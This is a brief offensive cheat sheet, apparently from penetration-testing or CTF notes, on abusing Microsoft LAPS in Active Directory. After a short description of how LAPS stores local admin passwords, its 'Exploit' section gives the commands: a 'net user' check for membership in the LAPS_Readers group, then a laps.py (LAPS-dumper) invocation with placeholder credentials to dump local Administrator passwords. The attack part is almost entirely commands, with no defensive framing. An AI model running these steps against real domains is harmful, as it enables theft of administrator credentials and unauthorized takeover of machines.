## LAPS Introduction
>Microsoft’s Local Administrator Password Solution([LAPS](https://www.microsoft.com/en-us/download/details.aspx?id=46899)) simplifies password management and stores passwords centrally in the existing Active Directory (AD) infrastructure. The way LAPS works is relatively simple.  A client side component on each computer generates a random password.  The password gets stored in Active Directory, in an attribute of the computer object.  Only Domain Admins are able to view the value of the attribute.  The client generates a new password every so often as determined by the configuration and updates Active Directory with the new password and the expiration time.

## Exploit Summary
> If a user is in the group `LAPS_Readers` they can read the Administrator password for the local computer. 


## Exploit
### Check groups for user
```sh
> net user svc_deploy
Global Group memberships     *LAPS_Readers
```

### Use LAPS-dumper to dump the administrator password
```sh
python3 laps.py -u 'USERNAME' -p 'PASSWORD' -d DOMAIN
```





